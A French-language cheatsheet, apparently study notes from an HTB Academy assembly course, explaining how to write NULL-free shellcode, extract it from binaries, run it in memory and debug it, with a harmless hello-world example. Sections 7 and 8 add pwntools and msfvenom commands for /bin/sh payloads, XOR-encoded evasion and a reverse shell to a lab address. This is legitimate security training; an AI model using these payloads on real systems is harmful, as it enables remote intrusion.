# Cheatsheet - Shellcoding (HTB Academy - Intro to Assembly Language)

> Prérequis : [intro-to-assembly-language.md](intro-to-assembly-language.md)

---

## 1. Qu'est-ce qu'un Shellcode ?

Un **shellcode** est la représentation hexadécimale du code machine exécutable d'un binaire (section `.text` uniquement). Il est conçu pour être chargé directement en mémoire et exécuté par le processeur, sans passer par un fichier exécutable classique.

### Utilisation en pentest
- **Buffer overflow** : injecter un shellcode (ex: reverse shell) dans la mémoire d'un programme vulnérable
- **Injection dans des binaires** : infecter des ELF/DLL/SO pour exécuter du code au chargement
- **Exécution en mémoire** : exécuter du code sans écrire sur le disque (fileless)
- **ROP (Return Oriented Programming)** : technique moderne pour contourner les protections mémoire (NX/DEP), nécessite une bonne compréhension de l'assembleur

---

## 2. Assembly vers Machine Code

Chaque instruction x86 et chaque registre a son propre code machine binaire (représenté en hex). `nasm` convertit les instructions assembleur en codes machines correspondants.

```bash
# Assembler une instruction en shellcode
pwn asm 'push rax' -c 'amd64'
# Résultat : 50

# Désassembler un shellcode en instructions
pwn disasm '50' -c 'amd64'
# Résultat : 0: 50  push eax
```

### Exemples de codes machines courants

| Instruction | Code machine |
|-------------|-------------|
| `push rax` | `50` |
| `push rbx` | `53` |
| `xor rax, rax` | `48 31 c0` |
| `mov al, 1` | `b0 01` |
| `syscall` | `0f 05` |

---

## 3. Exigences d'un shellcode valide

Un shellcode **doit** respecter 3 règles pour fonctionner correctement une fois chargé en mémoire :

| Règle | Raison |
|-------|--------|
| **Pas de variables** (pas de `.data` / `.bss`) | Le segment text est non-writable, le segment data est non-exécutable |
| **Pas d'adresses mémoire directes** | Les adresses changent selon l'environnement d'exécution |
| **Pas de bytes NULL (`0x00`)** | Les `00` sont des terminateurs de chaîne et interrompent le chargement |

### Pourquoi les NULL bytes posent problème

```bash
# Instruction avec NULL bytes :
pwn asm 'mov rax, 1' -c 'amd64'
# Résultat : 48c7c001000000  (contient des 00 !)

# Instructions équivalentes SANS NULL bytes :
pwn asm 'xor rax, rax' -c 'amd64'
# Résultat : 4831c0
pwn asm 'mov al, 1' -c 'amd64'
# Résultat : b001
```

---

## 4. Techniques de shellcoding

### 4.1 Supprimer les variables

Le code doit être entièrement dans la section `.text`. Pour les chaînes, on les pousse sur la stack :

```nasm
; AVANT (avec variable - NE FONCTIONNE PAS en shellcode) :
section .data
    message db "Hello HTB Academy!"
section .text
    mov rsi, message

; APRES (sans variable - shellcode compatible) :
section .text
    xor rbx, rbx
    mov bx, 'y!'           ; 2 bytes -> registre 16-bit
    push rbx
    mov rbx, 'B Academ'    ; 8 bytes -> registre 64-bit
    push rbx
    mov rbx, 'Hello HT'    ; 8 bytes -> registre 64-bit
    push rbx
    mov rsi, rsp            ; rsi pointe vers la chaîne sur la stack
```

> **Note** : les chaînes sont pushées en ordre **inverse** (la stack est LIFO).
> On n'a pas besoin de null-terminator ici car `write` utilise une longueur explicite.

### 4.2 Supprimer les adresses directes

- Remplacer les `call 0xADDRESS` par des `call label` (nasm convertit en adresses relatives)
- Utiliser l'adressage relatif à `rip` pour les références mémoire
- Pour les données, utiliser la stack + `rsp` comme pointeur

### 4.3 Supprimer les NULL bytes

La règle : utiliser des **registres de taille adaptée** à la donnée pour éviter le padding avec des `00`.

```nasm
; MAUVAIS (NULL bytes) :             ; BON (pas de NULL) :
mov rax, 1    ; 48c7c001000000       xor rax, rax  ; 4831c0
                                     mov al, 1     ; b001

mov rdi, 1    ; 48c7c701000000       xor rdi, rdi  ; 4831ff
                                     mov dil, 1    ; 40b701

mov rdi, 0    ; 48c7c700000000       xor rdi, rdi  ; 4831ff

mov rax, 60   ; 48c7c03c000000       xor rax, rax  ; 4831c0
                                     mov al, 60    ; b03c
```

> **Astuce** : Pour mettre 0 dans un registre, faire `xor reg, reg`. Pour pusher 0 sur la stack, xor un registre puis le push.

---

## 5. Scripts utilitaires

Tous les scripts sont également disponibles prêts à l'emploi dans [`tools/`](tools/) ([README](tools/README.md)).

```
 program.s ──► assembler.sh ──► shellcoder.py ──► loader.py ──► assembler.py
  (code ASM)    (compile+run)    (extract sc)     (exec sc)     (sc -> ELF + gdb)
   étape 1        étape 2          étape 3         étape 4        si debug
```

### 5.1 `assembler.sh` - Assembler + linker + exécuter (étape 1)

```bash
#!/bin/bash
# Usage : ./assembler.sh <fichier.s>

nasm -f elf64 "$1" -o "${1%.s}.o" && \
ld -o "${1%.s}" "${1%.s}.o" && \
rm "${1%.s}.o" && \
echo "[+] Assembled: ${1%.s}" && \
./"${1%.s}"
```

### 5.2 `shellcoder.py` - Extraire le shellcode d'un binaire (étape 2)

```python
#!/usr/bin/python3
# Usage : python3 shellcoder.py <binary>

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

file = ELF(sys.argv[1])
shellcode = file.section(".text")
print(shellcode.hex())

# Verification des NULL bytes + taille
if [i for i in shellcode if i == 0]:
    print("%d bytes - ATTENTION : Found NULL byte" % len(shellcode))
else:
    print("%d bytes - No NULL bytes" % len(shellcode))
```

### 5.3 `shellcoder.sh` - Alternative sans pwntools (étape 2)

```bash
#!/bin/bash
# Usage : ./shellcoder.sh <binary>

for i in $(objdump -d "$1" | grep "^ " | cut -f2); do echo -n $i; done; echo;
```

### 5.4 `loader.py` - Exécuter un shellcode en mémoire (étape 3)

```python
#!/usr/bin/python3
# Usage : python3 loader.py '<shellcode_hex>'

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

run_shellcode(unhex(sys.argv[1])).interactive()
```

### 5.5 `assembler.py` - Shellcode vers ELF pour debug gdb (étape 4)

```python
#!/usr/bin/python3
# Usage : python3 assembler.py '<shellcode_hex>' <output_binary>

import sys, os, stat
from pwn import *

context(os="linux", arch="amd64", log_level="error")

ELF.from_bytes(unhex(sys.argv[1])).save(sys.argv[2])
os.chmod(sys.argv[2], stat.S_IEXEC)
print("[+] Built: %s" % sys.argv[2])
```

---

## 6. Exemple complet de bout en bout

### Étape 1 : Écrire le code assembleur (version naive)

Fichier `helloworld.s` :

```nasm
global _start

section .data
    message db "Hello HTB Academy!"

section .text
_start:
    mov rsi, message
    mov rdi, 1
    mov rdx, 18
    mov rax, 1
    syscall

    mov rax, 60
    mov rdi, 0
    syscall
```

### Étape 2 : Assembler et tester

```bash
$ nasm -f elf64 helloworld.s -o helloworld.o
$ ld -o helloworld helloworld.o
$ ./helloworld
Hello HTB Academy!
```

### Étape 3 : Extraire le shellcode (version naive)

```bash
$ python3 shellcoder.py helloworld
48be0020400000000000bf01000000ba12000000b8010000000f05b83c000000bf000000000f05
37 bytes - ATTENTION : Found NULL byte
```

Le shellcode contient des NULL bytes et des références à `.data` : il ne fonctionnera pas en mémoire.

### Étape 4 : Vérifier en désassemblant

```bash
$ pwn disasm '48be0020400000000000bf01000000ba12000000b8010000000f05b83c000000bf000000000f05' -c 'amd64'
   0:    48 be 00 20 40 00 00     movabs rsi,  0x402000    # adresse directe !
   7:    00 00 00                                           # NULL bytes !
   a:    bf 01 00 00 00           mov    edi,  0x1          # NULL bytes !
   f:    ba 12 00 00 00           mov    edx,  0x12         # NULL bytes !
  14:    b8 01 00 00 00           mov    eax,  0x1          # NULL bytes !
  19:    0f 05                    syscall
  1b:    b8 3c 00 00 00           mov    eax,  0x3c         # NULL bytes !
  20:    bf 00 00 00 00           mov    edi,  0x0          # NULL bytes !
  25:    0f 05                    syscall
```

Problèmes identifiés :
- `0x402000` = adresse directe vers `.data`
- De nombreux `00` = NULL bytes partout

### Étape 5 : Réécrire en version shellcode-compatible

Fichier `helloworld_sc.s` :

```nasm
global _start

section .text
_start:
    ;--- Construire la chaîne sur la stack ---
    xor rbx, rbx
    mov bx, 'y!'            ; 2 bytes dans registre 16-bit (pas de padding)
    push rbx
    mov rbx, 'B Academ'     ; 8 bytes dans registre 64-bit
    push rbx
    mov rbx, 'Hello HT'     ; 8 bytes dans registre 64-bit
    push rbx
    mov rsi, rsp             ; rsi = pointeur vers la chaîne

    ;--- syscall write(1, rsi, 18) ---
    xor rax, rax
    mov al, 1                ; rax = 1 (write) - registre 8-bit
    xor rdi, rdi
    mov dil, 1               ; rdi = 1 (stdout) - registre 8-bit
    xor rdx, rdx
    mov dl, 18               ; rdx = 18 (longueur) - registre 8-bit
    syscall

    ;--- syscall exit(0) ---
    xor rax, rax
    add al, 60               ; rax = 60 (exit) - registre 8-bit
    xor dil, dil             ; rdi = 0 (code retour)
    syscall
```

### Étape 6 : Assembler et tester la nouvelle version

```bash
$ ./assembler.sh helloworld_sc.s
[+] Assembled: helloworld_sc
Hello HTB Academy!
```

### Étape 7 : Extraire et valider le shellcode

```bash
$ python3 shellcoder.py helloworld_sc
4831db66bb79215348bb422041636164656d5348bb48656c6c6f204854534889e64831c0b001
4831ff40b7014831d2b2120f054831c0043c4030ff0f05
61 bytes - No NULL bytes
```

Pas de NULL bytes !

### Étape 8 : Exécuter le shellcode directement en mémoire

```bash
$ python3 loader.py '4831db66bb79215348bb422041636164656d5348bb48656c6c6f204854534889e64831c0b0014831ff40b7014831d2b2120f054831c0043c4030ff0f05'
Hello HTB Academy!
```

Le shellcode fonctionne !

### Étape 9 : Debugger le shellcode avec gdb

```bash
# Convertir le shellcode en binaire ELF pour gdb
$ python3 assembler.py '4831db66bb79215348bb422041636164656d5348bb48656c6c6f204854534889e64831c0b0014831ff40b7014831d2b2120f054831c0043c4030ff0f05' helloworld_dbg

# Debugger
$ gdb -q ./helloworld_dbg
(gdb) b *0x401000          # breakpoint au point d'entrée par défaut
(gdb) r
Breakpoint 1, 0x0000000000401000 in ?? ()

# Vérifier les registres et la stack après les push
(gdb) si 7                 # avancer jusqu'après le dernier push
(gdb) x/s $rsp             # afficher la chaîne sur la stack
0x7fffffffe3b8: "Hello HTB Academy!"

(gdb) info registers rsi   # vérifier que rsi pointe bien vers la chaîne
(gdb) c                    # continuer l'exécution
Hello HTB Academy!
```

---

## 7. Shellcraft (pwntools)

Pwntools inclut `shellcraft`, un générateur de shellcodes pré-faits :

```bash
# Lister les shellcodes disponibles pour Linux x86_64
pwn shellcraft -l 'amd64.linux'

# Afficher le code assembleur d'un shellcode /bin/sh
pwn shellcraft amd64.linux.sh

# Exécuter directement le shellcode
pwn shellcraft amd64.linux.sh -r
```

### Utilisation en Python

```python
from pwn import *

context(os="linux", arch="amd64")

# Générer le shellcode pour execsh
shellcode = shellcraft.sh()
print(shellcode)              # affiche le code ASM

# Assembler et exécuter
binary = asm(shellcode)
print(binary.hex())           # affiche le shellcode hex
run_shellcode(binary).interactive()
```

---

## 8. Msfvenom

`msfvenom` (Metasploit) permet de générer des shellcodes plus complexes avec encodage :

```bash
# Lister les payloads Linux x64
msfvenom -l payloads | grep 'linux/x64'

# Générer un shellcode exec /bin/sh
msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'

# Générer avec encodage XOR (bypass simple)
msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'

# Reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f 'hex'

# Formats de sortie utiles
# -f hex     : hex string
# -f raw     : bytes bruts
# -f python  : tableau python
# -f c       : tableau C
# -f elf     : binaire ELF exécutable
```

---

## 9. Récapitulatif du workflow shellcoding

```
 1. Écrire le code ASM          vim program.s
         |
 2. Assembler + tester          ./assembler.sh program.s
         |
 3. Extraire le shellcode       python3 shellcoder.py program
         |
 4. Vérifier NULL bytes?  -----> OUI : corriger le code ASM (retour étape 1)
         |                        - xor reg, reg au lieu de mov reg, 0
         | NON                    - registres 8/16-bit adaptés
         |                        - pas de .data, pas d'adresses directes
 5. Charger en mémoire          python3 loader.py '<shellcode>'
         |
 6. Debugger si besoin          python3 assembler.py '<sc>' prog
                                gdb -q ./prog
                                b *0x401000
```

---

## 10. Shellcodes prêts à l'emploi et ressources

Voir le fichier dédié **[shellcodes-reference.md](shellcodes-reference.md)** pour :
- Shellcodes utiles par architecture (x86_64, x86, ARM64, ARM32, Windows)
- Génération automatique (shellcraft, msfvenom)
- Encodage XOR et évasion basique
- Tables de syscalls de référence
- Liens vers des ressources externes (Shell-Storm, Exploit-DB, CTF platforms...)

---

## 11. Aide-mémoire : registres et NULL bytes

Pour éviter les NULL bytes, toujours utiliser le **sous-registre adapté** :

| Valeur à charger | MAUVAIS (NULL bytes) | BON (pas de NULL) |
|------------------|---------------------|-------------------|
| 0 | `mov rax, 0` | `xor rax, rax` |
| 1-255 | `mov rax, 1` | `xor rax, rax` + `mov al, 1` |
| 256-65535 | `mov rax, 256` | `xor rax, rax` + `mov ax, 256` |
| Chaîne 2 bytes | `mov rbx, 'y!'` | `xor rbx, rbx` + `mov bx, 'y!'` |
| Chaîne 8 bytes | OK directement | `mov rbx, 'Hello HT'` (pas de padding) |
| Push 0 sur stack | `push 0` | `xor rax, rax` + `push rax` |

---
